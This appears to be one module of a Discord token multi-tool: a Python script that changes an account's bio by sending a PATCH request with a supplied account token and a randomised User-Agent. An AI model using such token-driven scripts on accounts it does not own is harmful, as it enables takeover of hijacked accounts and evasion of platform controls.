# Copyright (c) 2025-2026 v4lkyr0 — Buildware-Tools
# See the file 'LICENSE' for copying permission.
# --------------------------------------------------------
# EN: Non-commercial use only. Do not sell, remove credits
#     or redistribute without prior written permission.
# FR: Usage non-commercial uniquement. Ne pas vendre, supprimer
#     les crédits ou redistribuer sans autorisation écrite.

from Plugins.Utils import *
from Plugins.Config import *

try:
    import requests
except Exception as e:
    MissingModule(e)

Title("Discord Token Bio Changer")
Connection()

Scroll(GradientBanner(discord_banner))

try:
    token = ChoiceToken()
    new_bio = input(f"{INPUT} Bio {red}->{reset} ").strip()

    print(f"{LOADING} Changing Bio..", reset)

    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": RandomUserAgents()
    }

    payload = {"bio": new_bio}

    try:
        response = requests.patch("https://discord.com/api/v9/users/@me/profile", headers=headers, json=payload)
        if response.status_code == 200:
            print(f"{SUCCESS} Bio changed!", reset)
        else:
            print(f"{ERROR} Failed to change Bio!", reset)
    except:
        print(f"{ERROR} Error while trying to change Bio!", reset)

    Continue()
    Reset()

except Exception as e:
    Error(e)